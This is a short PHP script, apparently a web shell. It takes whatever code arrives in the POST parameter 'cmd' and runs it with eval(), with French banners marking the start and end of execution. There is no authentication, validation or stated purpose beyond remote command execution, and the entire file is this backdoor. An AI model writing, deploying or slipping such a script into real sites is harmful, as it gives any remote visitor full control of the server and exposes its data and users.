<?php

	echo "--- DEBUT D'EXECUTION DE LA COMMANDE ---\n\n";

	$cmd = $_POST['cmd'];

	eval($cmd);

	echo "\n\n--- FIN D'EXECUTION DE LA COMMANDE ---\n\n";

?>